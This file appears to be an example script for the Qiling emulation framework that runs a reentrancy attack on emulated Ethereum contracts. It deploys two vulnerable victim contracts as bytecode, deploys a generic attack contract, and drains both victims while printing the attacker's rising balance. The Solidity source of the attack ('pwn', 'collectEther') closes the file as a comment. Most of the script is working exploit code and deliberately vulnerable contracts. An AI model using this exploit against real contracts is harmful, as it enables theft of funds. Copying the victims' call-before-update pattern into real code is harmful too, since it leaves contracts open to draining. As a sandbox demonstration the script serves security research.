#!/usr/bin/env python3
# 
# Cross Platform and Multi Architecture Advanced Binary Emulation Framework
#

import sys

sys.path.append("../..")
from qiling import *
from qiling.arch.evm.vm.utils import bytecode_to_bytes, runtime_code_detector
from qiling.arch.evm.vm.vm import BaseVM
from qiling.arch.evm.constants import CREATE_CONTRACT_ADDRESS


def template(vic_contract, deposit, withdraw):
    Attack_contract     = '0x608060405234801561001057600080fd5b506040516020806104b883398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610435806100836000396000f30060806040526004361061004c576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063a75e462514610179578063ff11e1db146101e1575b670de0b6b3a76400006000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311115610177576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600060149054906101000a90047c0100000000000000000000000000000000000000000000000000000000027c01000000000000000000000000000000000000000000000000000000009004670de0b6b3a76400006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af192505050505b005b6101df60048036038101908080357bffffffffffffffffffffffffffffffffffffffffffffffffffffffff1916906020019092919080357bffffffffffffffffffffffffffffffffffffffffffffffffffffffff191690602001909291905050506101f8565b005b3480156101ed57600080fd5b506101f66103a9565b005b80600060146101000a81548163ffffffff02191690837c010000000000000000000000000000000000000000000000000000000090040217905550670de0b6b3a7640000341015151561024a57600080fd5b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16670de0b6b3a7640000837c01000000000000000000000000000000000000000000000000000000009004906040518263ffffffff167c010000000000000000000000000000000000000000000000000000000002815260040160006040518083038185885af19350505050506000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16817c01000000000000000000000000000000000000000000000000000000009004670de0b6b3a76400006040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808267ffffffffffffffff1681526020019150506000604051808303816000875af192505050505050565b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610406573d6000803e3d6000fd5b505600a165627a7a723058205aacb19a5864d2c460aed6c844f2aca575d87de6477ac757a72511bb2975b3f80029'
    
    ql = Qiling(code=Attack_contract, archtype="evm")
    vm:BaseVM = ql.arch.evm.vm

    C1 = b'\xaa' * 20
    C2 = b'\xbb' * 20
    User1 = b'\xcc' * 20
    User2 = b'\xde\xad\xbe\xef' * 5

    ql.arch.evm.create_account(C1)
    ql.arch.evm.create_account(C2)
    ql.arch.evm.create_account(User1, 100*10**18)
    ql.arch.evm.create_account(User2, 100*10**18)

    EtherStore_contract = vic_contract

    
    print('Init Victim   balance is', vm.state.get_balance(User1)/10**18)
    print('Init Attacker balance is', vm.state.get_balance(User2)/10**18)

    code1 = bytecode_to_bytes(EtherStore_contract)
    print('\n------ Deploy DeFi contract')
    # 1. deploy EtherStore
    msg1 = vm.build_message(None, 1, 3000000, CREATE_CONTRACT_ADDRESS, User1, 0, b'', code1, contract_address=C1)
    res = vm.execute_message(msg1)

    res_code = bytecode_to_bytes(res.output)
    runtime_code, aux_data, constructor_args = runtime_code_detector(res_code)
    rt_code = bytecode_to_bytes(runtime_code)
    print('Victim balance: ', vm.state.get_balance(User1)/10**18)

    print('\n------ Victim deposit Funds 20ETH to DeFi contract')
    # 2. User1 depositFunds 20ETH to bank
    call_data = deposit
    msg2 = vm.build_message(None, 1, 3000000, C1, User1, 20*10**18, bytecode_to_bytes(call_data), rt_code)
    res = vm.execute_message(msg2)
    # print(res.output)
    print('Victim balance: ', vm.state.get_balance(User1)/10**18)

    code2 = bytecode_to_bytes(Attack_contract+ql.arch.evm.abi.convert(['address'], [C1]))
    # print(code2.hex())
    print('\n------ Deploy Attack Contract')

    # 3. deploy Attack
    # ql.debugger = True
    msg3 = vm.build_message(None, 1, 3000000, CREATE_CONTRACT_ADDRESS, User2, 0, b'', code2, contract_address=C2)
    res = vm.execute_message(msg3)
    # ql.debugger = False

    res_code = bytecode_to_bytes(res.output)
    runtime_code, aux_data, constructor_args = runtime_code_detector(res_code)
    rt_code1 = bytecode_to_bytes(runtime_code)
    
    print('\n------ Attacker deposit 1 ETH to DeFi contract, Start Reentrancy Attack')
    # 4. User2 pwnEtherStore with 1ETH
    call_data = '0xa75e4625' + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes(deposit)]) + ql.arch.evm.abi.convert(['bytes4'], [bytecode_to_bytes(withdraw)])

    msg4 = vm.build_message(None, 1, 3000000, C2, User2, 1*10**18, bytecode_to_bytes(call_data), rt_code1)
    res = vm.execute_message(msg4)
    # print(res.output)
    print('Attacker balance: ', vm.state.get_balance(User2)/10**18)

    print('\n------ Attacker steal Ether from DeFi contract')
    # 5. User2 collectEther
    call_data = '0xff11e1db'
    msg5 = vm.build_message(None, 1, 3000000, C2, User2, 0, bytecode_to_bytes(call_data), rt_code1)
    res = vm.execute_message(msg5)
    print('Attacker balance: ', vm.state.get_balance(User2)/10**18)


if __name__ == '__main__':
    contract_1 = '0x6080604052670de0b6b3a764000060005534801561001c57600080fd5b506103b08061002c6000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680631031ec3114610072578063155dd5ee146100c957806327e235e3146100f65780637ddfe78d1461014d578063e2c41dbc14610178575b600080fd5b34801561007e57600080fd5b506100b3600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610182565b6040518082815260200191505060405180910390f35b3480156100d557600080fd5b506100f46004803603810190808035906020019092919050505061019a565b005b34801561010257600080fd5b50610137600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610317565b6040518082815260200191505060405180910390f35b34801561015957600080fd5b5061016261032f565b6040518082815260200191505060405180910390f35b610180610335565b005b60016020528060005260406000206000915090505481565b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101515156101e857600080fd5b60005481111515156101f957600080fd5b62093a80600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401421015151561024c57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff168160405160006040518083038185875af192505050151561028357600080fd5b80600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000206000828254039250508190555042600160003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000208190555050565b60026020528060005260406000206000915090505481565b60005481565b34600260003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055505600a165627a7a72305820707bf0ae11ce52ff7b7846ede3497d41b6fadea29579773fc70e8e61c0f549f10029'
    c1_deposit = '0xe2c41dbc'
    c1_withdraw = '0x155dd5ee'
    
    contract_2 = '0x608060405234801561001057600080fd5b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055506106dc806100616000396000f300608060405260043610610062576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630c08bf881461014d578063590e1ae314610164578063a9059cbb1461017b578063e42c08f2146101c8575b600080339150349050600060648281151561007957fe5b0614151561008657600080fd5b60648181151561009257fe5b046000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055507fc848a0bc6fc10f63d456eae535b952f8768bfd21d409b4933f8032cce0432ea48183604051808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a15050005b34801561015957600080fd5b5061016261021f565b005b34801561017057600080fd5b50610179610312565b005b34801561018757600080fd5b506101c6600480360381019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610434565b005b3480156101d457600080fd5b50610209600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610658565b6040518082815260200191505060405180910390f35b600034111561022d57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff16600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1614151561028957600080fd5b7fedf2f7451a6c99c99b58baaddbe18df51bec156fe6ae8dd3ea730168326f94cd3073ffffffffffffffffffffffffffffffffffffffff16316040518082815260200191505060405180910390a1600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16ff5b600080600034111561032357600080fd5b3391506000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050600081141561037557600080fd5b61038160648202610670565b60008060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055507f658eefd1c566207ffd3fb44f4d9b1e443698a39f8a6f7b134b3fef529e3f3f028183604051808381526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019250505060405180910390a15050565b60008034111561044357600080fd5b339050816000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054101561049157600080fd5b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054826000808673ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205401101561051c57600080fd5b816000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008282540392505081905550816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825401925050819055507fa25be434081445744d5b297a785f7b7073142ae4bcd91a0e7aa802f802b4e0c7828285604051808481526020018373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020018273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001935050505060405180910390a1505050565b60006020528060005260406000206000915090505481565b60003373ffffffffffffffffffffffffffffffffffffffff168260405160006040518083038185875af19250505090508015156106ac57600080fd5b50505600a165627a7a72305820e5031f476480cd5d80ec7b267c7bf4c672137328294cb6b71bbb631ce9b99fc20029'
    c2_deposit = ''
    c2_withdraw = '0x590e1ae3'

    template(contract_1, c1_deposit, c1_withdraw)
    print('\n\n\n**************************\n\n\n')
    template(contract_2, c2_deposit, c2_withdraw)


### genernal reentrancy poc ###

# contract Attack {
#   address victim;
#   bytes4 withdraw_id;

#   constructor(address addr) {
#       victim = addr;
#   }

#   function pwn(bytes4 deposit, bytes4 withdraw) public payable {
#       withdraw_id = withdraw;
#       // attack to the nearest ether
#       require(msg.value >= 1 ether);
#       // send eth to the depositFunds() function
#       victim.call.value(1 ether)(deposit);
#       victim.call(withdraw, 1 ether);
      
#       //etherStore.depositFunds.value(1 ether)();
#       // start the magic
#       //etherStore.withdrawFunds(1 ether);
#   }
  
#   function collectEther() public {
#       msg.sender.transfer(this.balance);
#   }
    
#   function () payable {
#       if (victim.balance > 1 ether) {
#           victim.call(withdraw_id,1 ether);
#       }
#   }
# }